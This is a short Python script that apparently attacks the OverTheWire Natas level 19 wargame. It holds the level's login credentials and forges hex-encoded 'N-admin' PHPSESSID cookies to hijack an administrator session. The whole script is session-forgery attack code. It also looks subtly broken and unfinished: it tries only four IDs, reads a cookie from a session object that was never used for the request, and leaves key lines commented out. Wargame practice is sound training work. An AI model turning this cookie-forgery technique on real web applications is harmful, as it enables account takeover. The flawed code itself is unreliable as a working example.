#!/usr/bin/env python3

import requests
import re
import binascii

username = 'natas19'
password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'

url = 'http://%s.natas.labs.overthewire.org/' % username

for i in range(4):
	session = requests.Session()

	temp = str("%d-admin" % i)
	temp = binascii.hexlify(temp.encode('utf-8'))
	print( { "PHPSESSID" + ": " + temp.decode('utf-8') } )
	# print("PHPSESSID: binascii.hexlify(b'(str("%d-admin" % i)'")
	response = requests.get(url, cookies = { "PHPSESSID": temp.decode('utf-8') }, auth = (username, password))
	# response = session.post(url, data = { "username": "natas20", "password": "pass" }, auth = (username, password))
	# content = response.text

	# print(content)
	print(bytes.fromhex(session.cookies['PHPSESSID']).decode('utf-8'))
	# print(re.findall('Password: (.*)</pre>', content)[0])